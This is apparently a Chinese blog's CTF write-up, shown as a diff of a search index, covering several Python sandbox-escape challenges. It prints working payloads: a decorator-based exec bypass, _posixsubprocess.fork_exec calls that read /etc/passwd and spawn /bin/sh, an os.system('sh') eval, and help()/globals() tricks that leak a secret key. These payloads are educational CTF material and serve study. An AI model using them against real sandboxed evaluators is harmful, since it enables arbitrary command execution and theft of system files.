+<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602144457799.png" alt="image-20240602144457799"></p>
+<h3 id="calc-jail-beginner-level7-JAIL"><a href="#calc-jail-beginner-level7-JAIL" class="headerlink" title="calc_jail_beginner_level7(JAIL)"></a>calc_jail_beginner_level7(JAIL)</h3><p>无附件，开题：<br><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602144750895.png" alt="image-20240602144750895"></p>
+<p>黑名单：<br><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602144818902.png" alt="image-20240602144818902"></p>
+<p>禁止了Call、import，等，导致不能调用函数和导入模块，尝试使用装饰器，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@exec</span><br><span class="line">@input</span><br><span class="line">class X:</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>
+
+<p>成功执行：<br><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602145323415.png" alt="image-20240602145323415"></p>
+<h3 id="calc-jail-beginner-level6-1-JAIL"><a href="#calc-jail-beginner-level6-1-JAIL" class="headerlink" title="calc_jail_beginner_level6.1(JAIL)"></a>calc_jail_beginner_level6.1(JAIL)</h3><p>无附件，开题：</p>
+<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602145513470.png" alt="image-20240602145513470"></p>
+<p>好像没有什么变化，继续使用level6的payload，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__loader__.load_module(&#x27;_posixsubprocess&#x27;).fork_exec([b&quot;/bin/cat&quot;,&quot;/etc/passwd&quot;], [b&quot;/bin/cat&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(&#x27;os&#x27;).pipe()), False,False, None, None, None, -1, None)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602150652172.png" alt="image-20240602150652172"></p>
+<p>这里尝试进入sh模式：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__loader__.load_module(&#x27;_posixsubprocess&#x27;).fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(&#x27;os&#x27;).pipe()), False,False, None, None, None, -1, None)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602150803916.png" alt="image-20240602150803916"></p>
+<p>连上后马上又断了，但是既然直接读有回回显，那么直接一条一条命令来执行，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__loader__.load_module(&#x27;_posixsubprocess&#x27;).fork_exec([b&quot;/bin/ls&quot;], [b&quot;/bin/ls&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(&#x27;os&#x27;).pipe()), False,False, None, None, None, -1, None)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602150932540.png" alt="image-20240602150932540"></p>
+<p>直接读flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__loader__.load_module(&#x27;_posixsubprocess&#x27;).fork_exec([b&quot;/bin/cat&quot;,&quot;flag&quot;], [b&quot;/bin/cat&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(&#x27;os&#x27;).pipe()), False,False, None, None, None, -1, None)</span><br></pre></td></tr></table></figure>
+
+<p>成功得到：</p>
+<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602151022629.png" alt="image-20240602151022629"></p>
+<p>看了一下其他师傅的做法，这里连上会断，可以尝试使用无限迭代器<code>itertools</code>，这是一个内建模块,不过在这里不能达到无限，需要拼手速发进去<code>cat flag</code>，注意下面这个方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[os := __import__(&#x27;os&#x27;), itertools := __loader__.load_module(&#x27;itertools&#x27;), _posixsubprocess := __loader__.load_module(&#x27;_posixsubprocess&#x27;), [_posixsubprocess.fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) for i in itertools.count(0)]]</span><br></pre></td></tr></table></figure>
+
+<p><strong>这里主要学习一下海象表达式的格式的利用以及无限迭代器的使用</strong></p>
+<h3 id="lake-lake-lake-JAIL"><a href="#lake-lake-lake-JAIL" class="headerlink" title="lake lake lake(JAIL)"></a>lake lake lake(JAIL)</h3><p>有附件，关键源码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_key_var_in_the_local_but_real_in_the_remote = <span class="string">&quot;[DELETED]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    code = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(code)&gt;<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">print</span>(<span class="string">&quot;you&#x27;re hacker!&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please enter the admin key&quot;</span>)</span><br><span class="line">    key = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(key == fake_key_var_in_the_local_but_real_in_the_remote):</span><br><span class="line">        code = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Nooo!!!!&quot;</span>)</span><br><span class="line">        ——————</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span>(input_data == <span class="string">&quot;1&quot;</span>):</span><br><span class="line">    func()</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">elif</span>(input_data == <span class="string">&quot;2&quot;</span>):</span><br><span class="line">    backdoor()</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;not found the choice&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>测试了一下，进入<code>func()</code>用不了，这里进入2来使用，但是这里的key没给，那么这里该如何利用呢，看源码，这里的key是个全局变量，还是有点小技巧，这里的<code>1</code>并不是完全没用，由于在2中只要key不等于这个就都是利用不了的，<strong>但是</strong>，这里可以在1里面读取<br>，这里可以采用<code>help()</code>进入，然后<code>__main__</code>读取（还可以只有<code>globals()</code>来读），如下：<br><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602154917456.png" alt="image-20240602154917456"></p>
+<p>得到key，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a34af94e88aed5c34fb5ccfe08cd14ab</span><br></pre></td></tr></table></figure>
+
+<p>最终得到flag：</p>
+<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602155017498.png" alt="image-20240602155017498"></p>
+<p>学到了，对变量的利用。</p>
+<h3 id="python2-input-JAIL"><a href="#python2-input-JAIL" class="headerlink" title="python2 input(JAIL)"></a>python2 input(JAIL)</h3><p>给了附件，部分源代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">input_data = input(&quot;&gt; &quot;)</span><br><span class="line">print input_data</span><br></pre></td></tr></table></figure>
+
+<p>外面套了一个print，这不就是我本地测试常用的吗，直接传入：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(&quot;__import__(&#x27;os&#x27;).system(&#x27;sh&#x27;)&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>成功：</p>
+<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602155417727.png" alt="image-20240602155417727"></p>
+<p>然后去看了一下其他师傅的wp，从这个print的格式可以看出是python2，<strong>考点</strong>是下面这个：</p>
+<p>在python2中， <code>input</code> 函数从标准输入接收输入，并且自动eval求值，返回求出来的值</p>
+<p>在python2中， <code>raw_input</code> 函数从标准输入接收输入，并返回输入字符串</p>
+<p>在python3中， <code>input</code> 函数从标准输入接收输入，并返回输入字符串</p>
+<p>可以简单的认为： <code>python2中input()</code> &#x3D; <code>python2中eval(raw_input())</code> &#x3D; <code>python3中eval(input())</code></p>
+<p>尝试了一下不套一个eval()传入，成功了，所以这里确实要注意一下</p>
+<h3 id="l-ke-l-ke-l-ke-JAIL"><a href="#l-ke-l-ke-l-ke-JAIL" class="headerlink" title="l@ke l@ke l@ke(JAIL)"></a>l@ke l@ke l@ke(JAIL)</h3><p>有附件，关键代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fake_key_var_in_the_local_but_real_in_the_remote = &quot;[DELETED]&quot;</span><br><span class="line"></span><br><span class="line">def func():</span><br><span class="line">    code = input(&quot;&gt;&quot;)</span><br><span class="line">    if(len(code)&gt;6):</span><br><span class="line">        return print(&quot;you&#x27;re hacker!&quot;)</span><br><span class="line">    try:</span><br><span class="line">        print(eval(code))</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">def backdoor():</span><br><span class="line">    print(&quot;Please enter the admin key&quot;)</span><br><span class="line">    key = input(&quot;&gt;&quot;)</span><br><span class="line">    if(key == fake_key_var_in_the_local_but_real_in_the_remote):</span><br><span class="line">        code = input(&quot;&gt;&quot;)</span><br><span class="line">        try:</span><br><span class="line">            print(eval(code))</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;Nooo!!!!&quot;)</span><br><span class="line">——————————</span><br><span class="line">input_data = input(&quot;&gt; &quot;)</span><br><span class="line">if(input_data == &quot;1&quot;):</span><br><span class="line">    func()</span><br><span class="line">    exit(0)</span><br><span class="line">elif(input_data == &quot;2&quot;):</span><br><span class="line">    backdoor()</span><br><span class="line">    exit(0)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;not found the choice&quot;)</span><br><span class="line">    exit(0)</span><br></pre></td></tr></table></figure>
+
+<p>源码和<code>lake lake lake</code>很像，只是将长度限制为6，key仍然是全局变量，还是可以使用<code>help()+__main__</code>来读取，这样就可以读取到变量值：<br><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602161347430.png" alt="image-20240602161347430"></p>
+<p>得到key为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">95c720690c2c83f0982ffba63ff87338</span><br></pre></td></tr></table></figure>
+
+<p>再进入2来传参，成功：<br><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602161507943.png" alt="image-20240602161507943"></p>
 ]]></content>
       <categories>
-        <category>php相关漏洞</category>
-        <category>对php的filter过滤器利用总结</category>
+        <category>Python漏洞</category>
+        <category>沙箱逃逸做题总结</category>
       </categories>
   </entry>
 </search>
